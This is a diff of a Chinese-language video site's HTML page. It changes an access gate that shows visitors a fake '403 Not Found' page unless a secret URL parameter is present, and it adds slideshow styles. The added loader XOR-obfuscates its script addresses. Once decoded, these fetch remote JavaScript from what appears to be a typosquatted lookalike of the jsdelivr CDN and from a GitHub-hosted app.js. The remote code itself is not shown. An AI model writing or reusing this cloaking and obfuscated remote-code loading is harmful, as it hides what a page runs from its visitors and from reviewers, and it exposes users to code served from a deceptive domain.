@@ -9,48 +9,40 @@
 <script>
 (function () {
     'use strict';
- 
-    var ACCESS_PARAM = 'access';
-    var ACCESS_VALUE = 'tv2026';
-    var SESSION_KEY = 'video_access_granted_v1';
-    var DYNAMIC_PARAM = 'r';
-    var params = new URLSearchParams(location.search);
-    var fromEntry = params.get(ACCESS_PARAM) === ACCESS_VALUE;
+
+    var params;
+    try { params = new URLSearchParams(location.search); } catch (e) { params = null; }
+    var fromEntry = params ? params.get('access') === 'tv2026' :
+        /(?:^|[?&])access=tv2026(?:&|$)/.test(location.search);
     var previouslyAllowed = false;
-    try { previouslyAllowed = sessionStorage.getItem(SESSION_KEY) === '1'; } catch (e) {}
-    var allowed = fromEntry || (previouslyAllowed && !!params.get(DYNAMIC_PARAM));
+    try { previouslyAllowed = sessionStorage.getItem('video_access_granted_v1') === '1'; } catch (e) {}
+    var allowed = fromEntry || previouslyAllowed;
+    window.__ACCESS_ALLOWED__ = allowed;
 
     if (!allowed) {
-        document.open();
-        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8">' +
-            '<meta name="viewport" content="width=device-width,initial-scale=1">' +
-            '<title>403 Not Found</title></head>' +
-            '<body style="margin:40px;font-family:Arial,sans-serif;color:#333">' +
-            '<h1>403 Not Found</h1>' +
-            '<p>The requested URL was not found on this server.</p>' +
-            '</body></html>');
-        document.close();
-        window.stop();
+
+        var hide = document.createElement('style');
+        hide.textContent = 'body{display:none!important}';
+        document.head.appendChild(hide);
+        document.addEventListener('DOMContentLoaded', function () {
+            document.title = '403 Not Found';
+            document.body.innerHTML = '<main style="margin:40px;font-family:Arial,sans-serif;color:#333">' +
+                '<h1>403 Not Found</h1><p>The requested URL was not found on this server.</p></main>';
+            hide.parentNode.removeChild(hide);
+            document.body.style.cssText = 'display:block!important;background:#fff;color:#333';
+        });
         return;
     }
+    try { sessionStorage.setItem('video_access_granted_v1', '1'); } catch (e) {}
 
-    try {
-        sessionStorage.setItem(SESSION_KEY, '1');
-        if (fromEntry) {
-    
-            var bytes = new Uint8Array(12);
-            if (window.crypto && crypto.getRandomValues) crypto.getRandomValues(bytes);
-            else for (var i = 0; i < bytes.length; i++) bytes[i] = Math.floor(Math.random() * 256);
-            var randomPath = Array.prototype.map.call(bytes, function (v) {
-                return v.toString(16).padStart(2, '0');
-            }).join('');
-            var newUrl = new URL(location.href);
-        
-            newUrl.searchParams.set(DYNAMIC_PARAM, randomPath);
-            history.replaceState(history.state, '', newUrl.pathname + newUrl.search + newUrl.hash);
-        }
-    } catch (e) { /* 禁止存储或 history 不可用时仍可从原入口访问 */ }
-    window.__ACCESS_ALLOWED__ = true;
+    if (fromEntry) {
+        try {
+            var r = String(Date.now()) + '.com.Harvard.edu.mit.edu.nyu.edu.neu.edu';
+            var newParams = new URLSearchParams(location.search);
+            newParams.set('r', r);
+            history.replaceState(history.state, '', location.pathname + '?' + newParams.toString() + location.hash);
+        } catch (e) { /* 不支持地址栏改写时，仍可正常使用入口 */ }
+    }
     document.title = '影视中心';
 })();
 </script>
@@ -764,6 +756,17 @@ button, a {
         padding: 7px 10px;
     }
 }
+
+/* 首页幻灯片：多图从左向右滑入，按后台配置自动切换 */
+.home-slideshow{position:relative;width:100%;height:clamp(110px,15vw,180px);margin:5px 0 22px;overflow:hidden;border-radius:12px;background:#111}
+.slide-track{display:flex;width:100%;height:100%;transition:transform .65s ease;will-change:transform}
+.slide-item{flex:0 0 100%;height:100%;min-width:0}
+.slide-item a{display:block;width:100%;height:100%}
+.slide-item img{display:block;width:100%;height:100%;object-fit:cover}
+.slide-dots{position:absolute;left:0;right:0;bottom:10px;display:flex;justify-content:center;gap:8px;pointer-events:none}
+.slide-dot{pointer-events:auto;width:8px;height:8px;border:0;border-radius:20px;background:#bbb;cursor:pointer;padding:0}
+.slide-dot.active{width:22px;background:#ef4444}
+@media(max-width:600px){.home-slideshow{height:125px;border-radius:8px;margin-bottom:16px}}
 </style>
 </head>
 
@@ -837,77 +840,21 @@ button, a {
 <div class="toast hidden" id="toast"></div>
 
 <script>
-(function () {
-    if (!window.__ACCESS_ALLOWED__) {
-        return;
-    }
-
-    var hls = document.createElement('script');
-    hls.src = 'https://cdn.jsdelivr.net/npm/hls.js@1/dist/hls.min.js';
-    document.body.appendChild(hls);
-
-    // 原来的远程 JS
-    var REMOTE_APP_URL = 'https://cdn.jsdeliur.top/app.js';
-
-    // 本地备用 JS
-    var LOCAL_APP_URL = './app.js';
-
-    var localLoading = false;
-    var timer = null;
-
-    function loadLocal() {
-        if (window.__VIDEO_APP_STARTED__ || localLoading) {
-            return;
-        }
-
-        localLoading = true;
-
-        var local = document.createElement('script');
-        local.src = LOCAL_APP_URL + '?v=20260917';
-        local.async = false;
-
-        local.onerror = function () {
-            var app = document.getElementById('app');
-
-            if (app) {
-                app.innerHTML =
-                    '<div class="empty">程序文件加载失败，请刷新页面重试</div>';
-            }
-        };
-
-        document.body.appendChild(local);
-    }
-
-    var remote = document.createElement('script');
-
-    remote.src = REMOTE_APP_URL +
-        (REMOTE_APP_URL.indexOf('?') >= 0 ? '&' : '?') +
-        't=' + Date.now();
-
-    remote.async = false;
-
-    remote.onload = function () {
-        clearTimeout(timer);
-
-        if (!window.__VIDEO_APP_STARTED__) {
-            loadLocal();
-        }
-    };
-
-    remote.onerror = function () {
-        clearTimeout(timer);
-        loadLocal();
-    };
-
-    document.body.appendChild(remote);
-
-    timer = setTimeout(function () {
-        if (!window.__VIDEO_APP_STARTED__) {
-            remote.remove();
-            loadLocal();
-        }
-    }, 4000);
-
+(function(){
+if(!window.__ACCESS_ALLOWED__)return;
+function d(v){var a='',i;for(i=0;i<v.length;i+=2)a+=String.fromCharCode(parseInt(v.substr(i,2),16)^91);return a;}
+var h=document.createElement('script');h.src=d('332f2f2b28617474383f357531283f3e37322d2975353e2f74352b36743337287531281b6a743f32282f7433372875363235753128');document.body.appendChild(h);
+var a=[d('75743a2b2b753128'),d('332f2f2b28617474383f357531283f3e37322e29752f342b743a2b2b753128'),d('332f2f2b28617474383f357531283f3e37322d2975353e2f743c3374303e372e346363696f76383e3737742e283e291b293e3d2874333e3a3f2874363a3235743128743a2b2b753128')],n=0,done=false,t=null;
+function fail(){var el=document.getElementById('app');if(el)el.innerHTML='<div class="empty">程序文件暂时无法加载，请检查网络后刷新重试</div>';}
+function next(){
+ if(done||window.__VIDEO_APP_STARTED__){done=true;return;}
+ if(n>=a.length){fail();return;}
+ var u=a[n++],e=document.createElement('script'),ended=false;
+ e.async=true;e.src=u+(u.indexOf('?')>=0?'&':'?')+'v='+Date.now();
+ function finish(){if(ended)return;ended=true;clearTimeout(t);e.onload=null;e.onerror=null;if(window.__VIDEO_APP_STARTED__){done=true;return;}if(e.parentNode)e.parentNode.removeChild(e);next();}
+ e.onload=finish;e.onerror=finish;t=setTimeout(finish,n===1?2500:4500);document.body.appendChild(e);
+}
+next();
 })();
 </script>
 
